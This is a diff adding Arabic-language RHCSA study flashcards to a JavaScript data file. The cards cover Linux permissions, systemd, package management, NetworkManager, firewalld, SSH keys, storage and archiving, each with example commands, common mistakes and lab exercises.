+                q: `ما هي أدوات إدارة المستخدمين؟`,
+                a: `useradd, usermod, userdel, groupadd, groupmod, groupdel.`,
+                example: `usermod -aG wheel user1`,
+                mistakes: `نسيان خيار <code>-a</code> (Append) مما يتسبب في إزالة المستخدم من جميع المجموعات الأخرى فوراً.`,
+                lab: `أضف مستخدماً لمجموعة wheel وتحقق بـ <code>groups user1</code>.`,
+                ref: `man usermod`,
+                related: ['useradd', 'userdel']
+            },
+            {
+                id: 16,
+                cat: "3️⃣ الهوية والصلاحيات (DAC)",
+                difficulty: "Beginner",
+                tags: ['Permissions'],
+                usedIn: ['RHCSA'],
+                q: `ما هي مستويات الأذونات الثلاثة؟`,
+                a: `User (u), Group (g), Others (o). ولكل منها: Read (r=4), Write (w=2), Execute (x=1).`,
+                example: `chmod u+rwx,g+rx,o-rwx file`,
+                mistakes: `إعطاء المستخدم إذن القراءة فقط للمجلد وتوقع قدرته على فتحه؛ المجلدات تحتاج x للدخول.`,
+                lab: `أنشئ مجلداً وعين له صلاحية r فقط للمجموعات، وجرب عمل <code>cd</code> داخله.`,
+                ref: `man chmod`,
+                related: ['chown', 'umask']
+            },
+            {
+                id: 17,
+                cat: "3️⃣ الهوية والصلاحيات (DAC)",
+                difficulty: "Beginner",
+                tags: ['Permissions'],
+                usedIn: ['RHCSA'],
+                q: `كيف تحسب الأذونات الرقمية 755؟`,
+                a: `7 = rwx (4+2+1) للمالك، 5 = r-x (4+0+1) للمجموعة، 5 = r-x للآخرين.`,
+                example: `chmod 755 run.sh`,
+                mistakes: `إعطاء الصلاحية الكاملة 777 لأي سكريبت مخصص، مما يعرض خادمك لثغرات حقن الكود.`,
+                lab: `حول ملف نصي لملف تشغيل بـ 755 وجرب تشغيله.`,
+                ref: `POSIX Permissions Guide`,
+                related: ['chmod', 'ls']
+            },
+            {
+                id: 18,
+                cat: "3️⃣ الهوية والصلاحيات (DAC)",
+                difficulty: "Advanced",
+                tags: ['Permissions'],
+                usedIn: ['RHCSA'],
+                q: `ما هو SetGID على مجلد وما فائدته؟`,
+                a: `chmod g+s /shared — أي ملف يُنشأ داخل المجلد يرث ملكية مجموعة المجلد الأصلي.`,
+                example: `chmod g+s /shared`,
+                mistakes: `تفعيل SetGID دون تغيير مجموعة المجلد الرئيسية لـ group الفريق المطلوب.`,
+                lab: `أنشئ مجلداً مشتركاً للفريق وعين SetGID وتأكد من وراثة المجموعة للملفات الجديدة.`,
+                ref: `man chmod (Special Permissions)`,
+                related: ['chown', 'umask']
+            },
+            {
+                id: 19,
+                cat: "3️⃣ الهوية والصلاحيات (DAC)",
+                difficulty: "Intermediate",
+                tags: ['Permissions'],
+                usedIn: ['RHCSA'],
+                q: `ما الفرق بين chmod و chown؟`,
+                a: `chmod — تغيير الأذونات. chown — تغيير المالك والمجموعة.
+4️⃣ العمليات والخدمات`,
+                example: `chown abdo:team file.txt`,
+                mistakes: `استخدام الفاصلة العادية بدلاً من النقطتين <code>:</code> لفصل اسم المالك والمجموعة.`,
+                lab: `قم بنقل ملكية ملف لمستخدم آخر ومجموعة مختلفة وتحقق بالتفاصيل.`,
+                ref: `man chown`,
+                related: ['chgrp', 'chmod']
+            },
+            {
+                id: 20,
+                cat: "4️⃣ العمليات والخدمات",
+                difficulty: "Intermediate",
+                tags: ['Systemd'],
+                usedIn: ['RHCSA'],
+                q: `ما هو PID وكيف تراقب العمليات؟`,
+                a: `Process ID — معرف فريد لكل عملية. ps (لقطة)، top/htop (تفاعلي)، pgrep (البحث).`,
+                example: `ps aux | grep nginx\npgrep nginx`,
+                mistakes: `الاعتقاد بأن ps يعرض الحالة المستمرة؛ ps يعرض لقطة ثابتة فقط للذاكرة الحالية.`,
+                lab: `افتح <code>htop</code> وراقب استهلاك المعالج للعمليات النشطة بشكل حي تفاعلي.`,
+                ref: `man ps`,
+                related: ['top', 'htop', 'kill']
+            },
+            {
+                id: 21,
+                cat: "4️⃣ العمليات والخدمات",
+                difficulty: "Expert",
+                tags: ['Systemd'],
+                usedIn: ['RHCSA'],
+                q: `ما هي خوارزمية CFS في Linux؟`,
+                a: `Completely Fair Scheduler — خوارزمية جدولة عادلة باستخدام شجرة بحث ثنائية (Red-Black Tree).`,
+                example: `CFS scheduler details`,
+                mistakes: `الاعتقاد بأن CFS يعتمد على الجدولة الزمنية البسيطة (Round Robin)؛ هو نظام متطور يعتمد على شجرة بحث حمراء-سوداء.`,
+                lab: `افحص ملفات نظام الجدولة عبر <code>cat /proc/sys/kernel/sched_latency_ns</code>.`,
+                ref: `Linux Kernel CFS Documentation`,
+                related: ['nice', 'chrt']
+            },
+            {
+                id: 22,
+                cat: "4️⃣ العمليات والخدمات",
+                difficulty: "Intermediate",
+                tags: ['Systemd'],
+                usedIn: ['RHCSA'],
+                q: `ما هو Nice Value وما هو نطاقه؟`,
+                a: `يحدد أولوية العملية. النطاق: -20 (أعلى أولوية) إلى 19 (أقل أولوية). الافتراضي: 0.`,
+                example: `nice -n 10 my_script.sh`,
+                mistakes: `محاولة المستخدم العادي خفض قيمة nice إلى قيم سالبة؛ النواة تمنع ذلك وتسمح فقط للـ root بتسريع العمليات.`,
+                lab: `شغّل عملية بقيمة nice موجبة كمستخدم عادي وتأكد بـ <code>ps -l</code>.`,
+                ref: `man nice`,
+                related: ['renice', 'top']
+            },
+            {
+                id: 23,
+                cat: "4️⃣ العمليات والخدمات",
+                difficulty: "Intermediate",
+                tags: ['Systemd'],
+                usedIn: ['RHCSA'],
+                q: `ما الفرق بين nice و renice؟`,
+                a: `nice — بدء عملية بأولوية محددة. renice — تغيير أولوية عملية قيد التشغيل.`,
+                example: `renice -n 5 -p 1234`,
+                mistakes: `استخدام nice بدلاً من renice لتعديل أولوية عملية تعمل بالفعل.`,
+                lab: `شغّل عملية بالخلفية، واحصل على الـ PID الخاص بها وقم بتغيير أولويتها بـ <code>renice</code>.`,
+                ref: `man renice`,
+                related: ['nice', 'kill']
+            },
+            {
+                id: 24,
+                cat: "4️⃣ العمليات والخدمات",
+                difficulty: "Intermediate",
+                tags: ['Systemd'],
+                usedIn: ['RHCSA'],
+                q: `ما الفرق بين SIGTERM و SIGKILL؟`,
+                a: `SIGTERM (15) — إنهاء سلمي يسمح بتنظيف الموارد. SIGKILL (9) — إنهاء قسري فوري.`,
+                example: `kill -15 PID\nkill -9 PID`,
+                mistakes: `استخدام <code>kill -9</code> كخيار أول دائماً؛ هذا يمنع العملية من حفظ حالتها وقد يتسبب في تلف قواعد البيانات.`,
+                lab: `شغّل عملية تجريبية، وجرب إنهاءها بـ SIGTERM أولاً، ثم قسرياً بـ SIGKILL.`,
+                ref: `man kill (إشارات النظام)`,
+                related: ['pkill', 'killall']
+            },
+            {
+                id: 25,
+                cat: "4️⃣ العمليات والخدمات",
+                difficulty: "Intermediate",
+                tags: ['Systemd'],
+                usedIn: ['RHCSA'],
+                q: `ما هو systemd وما يحل محله؟`,
+                a: `مدير النظام والخدمات. يحل محل SysVinit. يدير الخدمات عبر Unit Files.`,
+                example: `systemctl list-units --type=service`,
+                mistakes: `الخلط بين نظام systemd وأنظمة SysVinit القديمة التي كانت تعتمد على سكريبتات تسلسلية بطيئة.`,
+                lab: `ابحث عن وحدات الخدمات النشطة بالنظام باستخدام <code>systemctl</code>.`,
+                ref: `man systemd`,
+                related: ['systemctl', 'journalctl']
+            },
+            {
+                id: 26,
+                cat: "4️⃣ العمليات والخدمات",
+                difficulty: "Intermediate",
+                tags: ['Systemd'],
+                usedIn: ['RHCSA'],
+                q: `ما هي أوامر systemctl الأساسية؟`,
+                a: `start, stop, restart, reload, enable, disable, status, is-active, is-enabled.`,
+                example: `sudo systemctl enable --now httpd`,
+                mistakes: `تشغيل <code>enable</code> والاعتقاد أن الخدمة بدأت فوراً؛ <code>enable</code> يربطها بالإقلاع فقط ويجب استخدام <code>--now</code> لتشغيلها بالحال.`,
+                lab: `قم بتمكين وتشغيل خدمة جدار الحماية بأمر واحد وتأكد من حالتها.`,
+                ref: `man systemctl`,
+                related: ['service', 'chkconfig']
+            },
+            {
+                id: 27,
+                cat: "4️⃣ العمليات والخدمات",
+                difficulty: "Advanced",
+                tags: ['Systemd'],
+                usedIn: ['RHCSA'],
+                q: `ما هي ملفات تعريف Tuned المتاحة؟`,
+                a: `throughput-performance, latency-performance, virtual-guest, powersave, balanced.`,
+                example: `tuned-adm profile virtual-guest`,
+                mistakes: `تعديل إعدادات النواة يدوياً وبشكل عشوائي بدلاً من استخدام ملفات Tuned الجاهزة والآمنة.`,
+                lab: `اعرض الملفات المتاحة بـ <code>tuned-adm list</code> وقم بتهيئة الملف الموصى به لربط أداء السيرفر.`,
+                ref: `man tuned`,
+                related: ['tuned-adm', 'sysctl']
+            },
+            {
+                id: 28,
+                cat: "4️⃣ العمليات والخدمات",
+                difficulty: "Intermediate",
+                tags: ['Systemd', 'Defensive'],
+                usedIn: ['RHCSA', 'Defensive'],
+                q: `ما هي الإشارات (Signals) وكيف ترسلها؟`,
+                a: `kill -SIGTERM PID أو kill -15 PID. kill -9 PID للإنهاء القسري.
+5️⃣ البرمجيات والمستودعات`,
+                example: `kill -1 PID # SIGHUP`,
+                mistakes: `إرسال إشارة خاطئة تتسبب في إيقاف الخدمة بدلاً من إعادة قراءة الإعدادات.`,
+                lab: `أرسل إشارة SIGHUP لخادم الويب للتأكد من قراءة التكوين الجديد دون إيقاف الاتصالات الحالية.`,
+                ref: `man kill (Signals list)`,
+                related: ['kill', 'pkill']
+            },
+            {
+                id: 29,
+                cat: "5️⃣ البرمجيات والمستودعات",
+                difficulty: "Intermediate",
+                tags: ['Containers'],
+                usedIn: ['RHCSA'],
+                q: `ما هو DNF وما يحل محله؟`,
+                a: `Dandified YUM — مدير الحزم الحديث. يحل محل yum القديم.`,
+                example: `dnf install httpd`,
+                mistakes: `استخدام أدوات إدارة قديمة أو نسيان تحديث المستودعات قبل البحث عن حزمة.`,
+                lab: `ابحث عن حزمة معينة وقم بتثبيتها وتحديثها بـ <code>dnf</code>.`,
+                ref: `man dnf`,
+                related: ['rpm', 'yum']
+            },
+            {
+                id: 30,
+                cat: "5️⃣ البرمجيات والمستودعات",
+                difficulty: "Intermediate",
+                tags: ['Containers'],
+                usedIn: ['RHCSA'],
+                q: `ما الفرق بين BaseOS و AppStream؟`,
+                a: `BaseOS — حزم أساسية بدورة حياة طويلة. AppStream — إصدارات متعددة من التطبيقات واللغات البرمجية.`,
+                example: `dnf module list python`,
+                mistakes: `تثبيت حزم عشوائية من الويب بدلاً من الاعتماد على مستودعات AppStream المعزولة والآمنة.`,
+                lab: `تصفح وحدات AppStream البرمجية المتاحة بالنظام وقارن إصداراتها.`,
+                ref: `RHEL Application Streams Guide`,
+                related: ['dnf module', 'repoquery']
+            },
+            {
+                id: 31,
+                cat: "5️⃣ البرمجيات والمستودعات",
+                difficulty: "Intermediate",
+                tags: ['Containers'],
+                usedIn: ['RHCSA'],
+                q: `ما هي Flatpak وما ميزتها؟`,
+                a: `تقنية لتثبيت تطبيقات معزولة (Sandboxed) مع تبعياتها الخاصة، لا تتداخل مع حزم النظام.`,
+                example: `flatpak list`,
+                mistakes: `محاولة تشغيل حزم flatpak بصلاحيات root كاملة؛ هي مصممة أساساً للعزل التام للمستخدم العادي.`,
+                lab: `ابحث عن تطبيق معزول داخل مستودع flatpak وتأكد من عزله.`,
+                ref: `Flatpak Documentation`,
+                related: ['snap', 'docker']
+            },
+            {
+                id: 32,
+                cat: "5️⃣ البرمجيات والمستودعات",
+                difficulty: "Intermediate",
+                tags: ['Containers'],
+                usedIn: ['RHCSA'],
+                q: `كيف تثبت تطبيق Flatpak؟`,
+                a: `flatpak remote-add --if-not-exists flathub https://flathub.org/repo/flathub.flatpakrepo ثم flatpak install flathub app.name
+6️⃣ الشبكات`,
+                example: `flatpak install flathub org.gimp.GIMP`,
+                mistakes: `نسيان إضافة مستودع flathub أولاً مما يؤدي إلى فشل التثبيت.`,
+                lab: `أضف مستودع flathub وثبت تطبيقاً معزولاً للتحقق من سلامة الأداة.`,
+                ref: `flatpak install manual`,
+                related: ['flatpak run', 'flatpak update']
+            },
+            {
+                id: 33,
+                cat: "6️⃣ الشبكات",
+                difficulty: "Advanced",
+                tags: ['Networking'],
+                usedIn: ['RHCSA'],
+                q: `ما هو التحول الجذري في RHEL 9 لإدارة الشبكة؟`,
+                a: `التخلي عن ملفات ifcfg في /etc/sysconfig/network-scripts/ والاعتماد الكامل على keyfile في /etc/NetworkManager/system-connections/.`,
+                example: `cat /etc/NetworkManager/system-connections/eth0.nmconnection`,
+                mistakes: `محاولة تعديل ملفات ifcfg القديمة في RHEL 9 دون جدوى؛ حيث تم ترحيل التكوين بالكامل لصيغة keyfile.`,
+                lab: `تصفح مسار تكوين الاتصالات الجديد واطلع على ملف الكرت الرئيسي.`,
+                ref: `RHEL 9 Networking Administration Guide`,
+                related: ['nmcli', 'nmtui']
+            },
+            {
+                id: 34,
+                cat: "6️⃣ الشبكات",
+                difficulty: "Advanced",
+                tags: ['Networking'],
+                usedIn: ['RHCSA'],
+                q: `ما هو NetworkManager keyfile؟`,
+                a: `تنسيق INI لتخزين إعدادات الاتصالات (IP, Gateway, DNS) بصيغة .nmconnection.`,
+                example: `nmcli connection show`,
+                mistakes: `كتابة إعدادات يدوية خاطئة في ملف التكوين مباشرة دون استخدام nmcli للتحقق.`,
+                lab: `افحص تكوين الاتصال الحالي وعناوين الـ IP بصيغة keyfile.`,
+                ref: `NetworkManager.conf Reference`,
+                related: ['nmcli', 'ip addr']
+            },
+            {
+                id: 35,
+                cat: "6️⃣ الشبكات",
+                difficulty: "Advanced",
+                tags: ['Networking'],
+                usedIn: ['RHCSA'],
+                q: `كيف ترحل إعدادات ifcfg القديمة إلى keyfile؟`,
+                a: `nmcli connection migrate`,
+                example: `nmcli connection migrate`,
+                mistakes: `حذف الملفات القديمة بالخطأ بدلاً من عمل ترحيل آمن وتلقائي للـ keyfile.`,
+                lab: `قم بتنفيذ أمر الترحيل للتأكد من تحويل الملفات القديمة إلى keyfile بنجاح.`,
+                ref: `nmcli migration command documentation`,
+                related: ['nmcli', 'systemctl reload NetworkManager']
+            },
+            {
+                id: 36,
+                cat: "6️⃣ الشبكات",
+                difficulty: "Intermediate",
+                tags: ['Networking'],
+                usedIn: ['RHCSA'],
+                q: `ما هي أدوات إدارة الشبكة في RHEL 9؟`,
+                a: `nmcli (CLI), nmtui (TUI), nm-connection-editor (GUI), ip (iproute2).`,
+                example: `nmcli connection modify eth0 ipv4.addresses 192.168.1.10/24`,
+                mistakes: `كتابة الأوامر يدوياً وتجاوز واجهة nmtui المسهلة للمبتدئين.`,
+                lab: `افتح واجهة <code>nmtui</code> الرسومية السطرية وقم بتعديل الـ IP لكرت افتراضي.`,
+                ref: `man nmcli / man nmtui`,
+                related: ['ip', 'ping']
+            },
+            {
+                id: 37,
+                cat: "6️⃣ الشبكات",
+                difficulty: "Advanced",
+                tags: ['Networking'],
+                usedIn: ['RHCSA'],
+                q: `ما هي صلاحيات ملفات keyfile الموصى بها؟`,
+                a: `chmod 600 لمنع تسريب كلمات مرور الشبكة.
+7️⃣ جدار الحماية والوصول عن بعد`,
+                example: `chmod 600 /etc/NetworkManager/system-connections/*`,
+                mistakes: `ترك الصلاحيات مفتوحة مما يسمح لأي مستخدم محلي بقراءة كلمات السر للشبكة.`,
+                lab: `تحقق من صلاحيات ملف التكوين للكرت واضبطها لتكون محصورة لـ root فقط.`,
+                ref: `NetworkManager Security Guide`,
+                related: ['chmod', 'ls -l']
+            },
+            {
+                id: 38,
+                cat: "7️⃣ جدار الحماية والوصول عن بعد",
+                difficulty: "Intermediate",
+                tags: ['Defensive'],
+                usedIn: ['RHCSA', 'Defensive'],
+                q: `ما هو firewalld وما هي Zones؟`,
+                a: `مدير جدار الحماية يصنف حركة المرور حسب الثقة:
+public — الافتراضية
+drop — إسقاط الحزم بدون رد
+trusted — قبول كل الاتصالات
+internal, work, home, block`,
+                example: `firewall-cmd --get-active-zones`,
+                mistakes: `تطبيق القواعد على كرت شبكة دون معرفة المنطقة (Zone) النشطة والمرتبطة به.`,
+                lab: `اعرض المناطق النشطة بجدار الحماية وحدد الكرت الخاص بك.`,
+                ref: `man firewalld`,
+                related: ['firewall-cmd', 'nftables']
+            },
+            {
+                id: 39,
+                cat: "7️⃣ جدار الحماية والوصول عن بعد",
+                difficulty: "Intermediate",
+                tags: ['Defensive'],
+                usedIn: ['RHCSA', 'Defensive'],
+                q: `ما الفرق بين --permanent و Runtime في firewalld؟`,
+                a: `بدون --permanent = يختفي بعد إعادة التشغيل. مع --permanent + firewall-cmd --reload = دائم.`,
+                example: `firewall-cmd --permanent --add-service=http && firewall-cmd --reload`,
+                mistakes: `كتابة القواعد في الذاكرة الحالية فقط وتوقع بقائها نشطة بعد إعادة التشغيل.`,
+                lab: `أضف منفذاً لجدار الحماية بصيغة دائمة وتأكد من بقائه بعد عمل reload.`,
+                ref: `firewall-cmd manual`,
+                related: ['firewall-cmd --list-all', 'iptables']
+            },
+            {
+                id: 40,
+                cat: "7️⃣ جدار الحماية والوصول عن بعد",
+                difficulty: "Intermediate",
+                tags: ['Defensive'],
+                usedIn: ['RHCSA', 'Defensive'],
+                q: `كيف تضيف خدمة بشكل دائم في firewalld؟`,
+                a: `firewall-cmd --permanent --add-service=http ثم firewall-cmd --reload`,
+                example: `firewall-cmd --permanent --add-service=http`,
+                mistakes: `نسيان تنفيذ أمر <code>--reload</code> بعد إضافة القواعد الدائمة فلا تفعل فوراً.`,
+                lab: `أضف خدمة HTTP لجدار الحماية بشكل دائم ثم فعلها فورياً بالـ reload.`,
+                ref: `firewall-cmd services reference`,
+                related: ['firewall-cmd', 'systemctl restart firewalld']
+            },
+            {
+                id: 41,
+                cat: "7️⃣ جدار الحماية والوصول عن بعد",
+                difficulty: "Intermediate",
+                tags: ['SSH'],
+                usedIn: ['RHCSA'],
+                q: `ما هو SSH وما هي المصادقة بالمفاتيح؟`,
+                a: `Secure Shell — بروتوكول إدارة عن بعد. المصادقة بالمفاتيح: ssh-keygen (توليد زوج مفاتيح) + ssh-copy-id (نسخ المفتاح العام).`,
+                example: `ssh-keygen -t rsa -b 4096\nssh-copy-id user@server`,
+                mistakes: `مشاركة المفتاح الخاص (Private Key) بدلاً من المفتاح العام (Public Key).`,
+                lab: `ولد مفاتيح تشفير محلياً وانسخ المفتاح العام لسيرفر افتراضي وتأكد من الدخول بدون باسورد.`,
+                ref: `man ssh-keygen / man ssh-copy-id`,
+                related: ['ssh', 'sshd']
+            },
+            {
+                id: 42,
+                cat: "7️⃣ جدار الحماية والوصول عن بعد",
+                difficulty: "Intermediate",
+                tags: ['SSH'],
+                usedIn: ['RHCSA'],
+                q: `ما الفرق بين المفتاح العام والخاص في SSH؟`,
+                a: `المفتاح الخاص (id_rsa) — على جهاز المسؤول (يحفظ بسرية). المفتاح العام (id_rsa.pub) — على الخادم الهدف.`,
+                example: `cat ~/.ssh/id_rsa.pub # المفتاح العام`,
+                mistakes: `رفع المفتاح الخاص <code>id_rsa</code> إلى السيرفرات مما يشكل خطراً أمنياً جسيماً.`,
+                lab: `افحص محتويات مجلد <code>~/.ssh/</code> وتعرف على المفتاح العام والخاص.`,
+                ref: `OpenSSH Key Management`,
+                related: ['ssh', 'scp']
+            },
+            {
+                id: 43,
+                cat: "7️⃣ جدار الحماية والوصول عن بعد",
+                difficulty: "Advanced",
+                tags: ['SSH'],
+                usedIn: ['RHCSA'],
+                q: `ما هي Passphrase في SSH Keys؟`,
+                a: `عبارة مرور إضافية لحماية المفتاح الخاص حتى لو سرق.
+8️⃣ التخزين`,
+                example: `ssh-keygen -p # لتغيير عبارة المرور للمفتاح الخاص`,
+                mistakes: `استخدام مفتاح بدون Passphrase؛ فإذا سرق المفتاح سيتمكن المهاجم من ولوج كافة السيرفرات فوراً.`,
+                lab: `قم بحماية مفتاحك الخاص بعبارة مرور قوية وتأكد من طلبها عند الاتصال.`,
+                ref: `SSH Security Best Practices`,
+                related: ['ssh-agent', 'ssh-add']
+            },
+            {
+                id: 44,
+                cat: "8️⃣ التخزين",
+                difficulty: "Intermediate",
+                tags: ['Storage'],
+                usedIn: ['RHCSA'],
+                q: `ما الفرق بين MBR و GPT؟`,
+                a: `MBR — 4 أقسام أساسية كحد أقصى، 2TB سعة. GPT — 128 قسماً، 8 ZB، UEFI، Checksums.`,
+                example: `parted /dev/sdb print`,
+                mistakes: `تقسيم قرص بحجم 4TB بنظام تقسيم MBR القديم مما يضيع نصف مساحته تقريباً.`,
+                lab: `افحص القرص الصلب وحدد نظام التقسيم الحالي (GPT أم MBR).`,
+                ref: `man parted`,
+                related: ['fdisk', 'gdisk']
+            },
+            {
+                id: 45,
+                cat: "8️⃣ التخزين",
+                difficulty: "Intermediate",
+                tags: ['Storage'],
+                usedIn: ['RHCSA'],
+                q: `ما هي أداة التقسيم الحديثة في RHEL؟`,
+                a: `parted (تدعم MBR و GPT). fdisk يدعم GPT أيضاً في الإصدارات الحديثة.`,
+                example: `parted /dev/sdb mklabel gpt`,
+                mistakes: `استخدام fdisk التقليدي وتجاوز parted الموصى به لإدارة GPT برمجياً.`,
+                lab: `قم بتهيئة قرص فارغ وجدولة تقسيماته بصيغة GPT باستخدام <code>parted</code>.`,
+                ref: `parted partitions guide`,
+                related: ['fdisk', 'lsblk']
+            },
+            {
+                id: 46,
+                cat: "8️⃣ التخزين",
+                difficulty: "Advanced",
+                tags: ['Storage'],
+                usedIn: ['RHCSA'],
+                q: `ما هو نظام الملفات الافتراضي في RHEL؟`,
+                a: `XFS — أداء عالي وموثوقية. لا يدعم التقليص (Shrink)!`,
+                example: `mkfs.xfs /dev/sdb1`,
+                mistakes: `تخطيط مساحة LVM وتوقع إمكانية تقليص حجم XFS لاحقاً؛ XFS لا يمكن تقليسه أبداً.`,
+                lab: `أنشئ قسم XFS جديد وتحقق من إمكانية زيادته وعدم إمكانية تصغيره.`,
+                ref: `man mkfs.xfs`,
+                related: ['xfs_growfs', 'mount']
+            },
+            {
+                id: 47,
+                cat: "8️⃣ التخزين",
+                difficulty: "Advanced",
+                tags: ['Storage'],
+                usedIn: ['RHCSA'],
+                q: `كيف تُنشئ مساحة Swap؟`,
+                a: `mkswap /dev/sdXn ثم swapon /dev/sdXn. للدائم: أضف إلى /etc/fstab باستخدام UUID.`,
+                example: `mkswap /dev/sdb2 && swapon /dev/sdb2`,
+                mistakes: `نسيان إضافة المعرف UUID في fstab مما يؤدي لتعطيل الـ swap بعد إعادة التشغيل.`,
+                lab: `قم بتهيئة قسم swap وتفعيله وإضافته لملف fstab وتأكد بـ <code>swapon --show</code>.`,
+                ref: `man swapon / man mkswap`,
+                related: ['free -m', 'swapoff']
+            },
+            {
+                id: 48,
+                cat: "8️⃣ التخزين",
+                difficulty: "Advanced",
+                tags: ['Storage'],
+                usedIn: ['RHCSA'],
+                q: `ما هو LVM وما هي طبقاته الثلاث؟`,
+                a: `Logical Volume Manager:
+PV (Physical Volume) — pvcreate
+VG (Volume Group) — vgcreate
+LV (Logical Volume) — lvcreate`,
+                example: `pvcreate /dev/sdb1\nvgcreate vg_data /dev/sdb1\nlvcreate -n lv_files -L 10G vg_data`,
+                mistakes: `الخلط بين طبقات LVM ومحاولة إنشاء Logical Volume مباشرة دون إنشاء VG أولاً.`,
+                lab: `قم بإنشاء وتكوين دورة LVM كاملة من القرص الصلب وحتى المجلد المنطقي.`,
+                ref: `man lvm`,
+                related: ['pvdisplay', 'vgdisplay', 'lvdisplay']
+            },
+            {
+                id: 49,
+                cat: "8️⃣ التخزين",
+                difficulty: "Advanced",
+                tags: ['Storage'],
+                usedIn: ['RHCSA'],
+                q: `كيف توسع LV على XFS؟`,
+                a: `lvextend -L +10G /dev/vg_name/lv_name ثم xfs_growfs /mount/point`,
+                example: `lvextend -L +5G /dev/vg_data/lv_files && xfs_growfs /mnt/files`,
+                mistakes: `توسيع الـ Volume المنطقي (lvextend) ونسيان توسيع نظام الملفات (xfs_growfs).`,
+                lab: `قم بزيادة مساحة مجلد LVM موصول بالنظام حياً وتحقق من انعكاس المساحة بـ <code>df -h</code>.`,
+                ref: `man xfs_growfs / man lvextend`,
+                related: ['resize2fs', 'df']
+            },
+            {
+                id: 50,
+                cat: "8️⃣ التخزين",
+                difficulty: "Expert",
+                tags: ['Storage'],
+                usedIn: ['RHCSA'],
+                q: `ما هو Stratis وما ميزته؟`,
+                a: `إطار تخزين حديث يعتمد على Thin Provisioning وأتمتة LVM/XFS. يدعم Snapshots.`,
+                example: `stratis pool create my_pool /dev/sdb\nstratis filesystem create my_pool fs_files`,
+                mistakes: `تهيئة القرص يدوياً قبل إضافته لـ Stratis؛ الأداة تتطلب قرصاً فارغاً بالكامل لتهيئته تلقائياً.`,
+                lab: `أنشئ تجميعة Stratis وقسم ملفات ذكي وتحقق من تفعيله.`,
+                ref: `man stratis`,
+                related: ['stratisd', 'mount']
+            },
+            {
+                id: 51,
+                cat: "8️⃣ التخزين",
+                difficulty: "Expert",
+                tags: ['Storage'],
+                usedIn: ['RHCSA'],
+                q: `ما هو Thin Provisioning؟`,
+                a: `تخصيص ظاهري — نظام ملفات يبدو بحجم هائل لكنه يستهلك فقط المساحة الفعلية المكتوبة.`,
+                example: `Stratis Thin Provisioning Concept`,
+                mistakes: `الاعتقاد بأن مساحة التخزين محجوزة مسبقاً بالكامل على القرص؛ هي مساحة وهمية تستهلك الفعلي فقط.`,
+                lab: `افحص استهلاك مساحة Stratis الحقيقية مقابل الافتراضية بـ <code>stratis pool list</code>.`,
+                ref: `RHEL Stratis Storage Management`,
+                related: ['stratis pool', 'stratis fs']
+            },
+            {
+                id: 52,
+                cat: "8️⃣ التخزين",
+                difficulty: "Advanced",
+                tags: ['Storage'],
+                usedIn: ['RHCSA'],
+                q: `ما هو NFS وما هو Autofs؟`,
+                a: `NFS — مشاركة ملفات عبر الشبكة. Autofs — تركيب تلقائي عند الطلب (On-demand) وفك الارتباط بعد فترة الخمول.`,
+                example: `systemctl start autofs`,
+                mistakes: `ترك اتصالات NFS معلقة ومفتوحة بشكل دائم بدون استخدام autofs مما يبطئ السيرفر.`,
+                lab: `ثبت خدمة <code>autofs</code> وقم بتهيئة تركيب تلقائي لمجلد بعيد.`,
+                ref: `man autofs`,
+                related: ['mount', 'showmount']
+            },
+            {
+                id: 53,
+                cat: "8️⃣ التخزين",
+                difficulty: "Advanced",
+                tags: ['Storage'],
+                usedIn: ['RHCSA'],
+                q: `كيف تُعد Autofs؟`,
+                a: `خريطة رئيسية في /etc/auto.master.d/ + خريطة فرعية (Indirect Map) تربط مساراً محلياً بخادم بعيد.`,
+                example: `/etc/auto.master.d/direct.autofs`,
+                mistakes: `خطأ في بناء قواعد خريطة الربط الفرعية مما يؤدي لفشل خدمة autofs بالكامل.`,
+                lab: `قم بتهيئة خريطة ربط غير مباشرة (Indirect Map) لتركيب مجلد NFS تلقائياً.`,
+                ref: `Autofs Configuration Reference`,
+                related: ['automount', 'systemctl status autofs']
+            },
+            {
+                id: 54,
+                cat: "8️⃣ التخزين",
+                difficulty: "Advanced",
+                tags: ['Storage'],
+                usedIn: ['RHCSA'],
+                q: `ما هو UUID ولماذا نستخدمه في /etc/fstab؟`,
+                a: `معرف فريد عالمي — يضمن عدم تأثر التركيب بتغير مسارات الأجهزة (مثل /dev/sda → /dev/sdb).
+9️⃣ الأرشفة والجدولة`,
+                example: `blkid /dev/sdb1`,
+                mistakes: `كتابة مسار القرص مثل /dev/sdb1 في fstab؛ فإذا تغير ترتيب الأقراص سيفشل النظام بالإقلاع تماماً.`,
+                lab: `احصل على الـ UUID لقسم تخزيني واستخدمه لتثبيته في fstab بشكل آمن ودائم.`,
+                ref: `man blkid / man fstab`,
+                related: ['mount -a', 'findmnt']
+            },
+            {
+                id: 55,
+                cat: "9️⃣ الأرشفة والجدولة",
+                difficulty: "Beginner",
+                tags: ['Filesystem'],
+                usedIn: ['RHCSA'],
+                q: `ما الفرق بين tar و gzip؟`,
+                a: `tar — جمع ملفات في أرشيف واحد. gzip/bzip2/xz — ضغط الأرشيف.`,
+                example: `tar -cf archive.tar /source_dir\ngzip archive.tar`,
+                mistakes: `الاعتقاد بأن tar يضغط الحجم تلقائياً؛ tar يجمع الملفات فقط ويجب استخدام gzip للضغط.`,
+                lab: `أنشئ أرشيفاً بـ tar ثم قم بضغطه بـ gzip لملاحظة تغير الحجم.`,
+                ref: `man tar / man gzip`,
+                related: ['zip', 'unzip']
+            },
+            {
+                id: 56,
+                cat: "9️⃣ الأرشفة والجدولة",
+                difficulty: "Intermediate",
+                tags: ['Filesystem'],
+                usedIn: ['RHCSA'],
+                q: `كيف تضغط أرشيف بأقصى ضغط؟`,
+                a: `tar -cJf archive.tar.xz /path (xz = أعلى ضغط، أبطأ). -czf = gzip (أسرع، أقل ضغط).`,
+                example: `tar -cJf archive.tar.xz /source`,
+                mistakes: `استخدام خيار خاطئ مثل <code>-z</code> (المخصص لـ gzip) مع تسمية الملف بامتداد <code>.xz</code>.`,
+                lab: `قارن حجم وضغط أرشيف xz مقابل أرشيف gzip لنفس الملفات.`,
+                ref: `tar compression options manual`,
+                related: ['xz', 'bzip2']
+            },
+            {
+                id: 57,
+                cat: "9️⃣ الأرشفة والجدولة",
+                difficulty: "Intermediate",
+                tags: ['Filesystem'],
+                usedIn: ['RHCSA'],
+                q: `ما هي ميزة rsync؟`,
+                a: `Delta Transfer Algorithm — ينقل الأجزاء المعدلة فقط، يوفر النطاق الترددي.`,
+                example: `rsync -avz --delete /src/ /dest/`,
+                mistakes: `نسيان الشرطة المائلة الأخيرة <code>/</code> في مسار المصدر مما يتسبب في نسخ المجلد نفسه بدلاً من محتوياته.`,
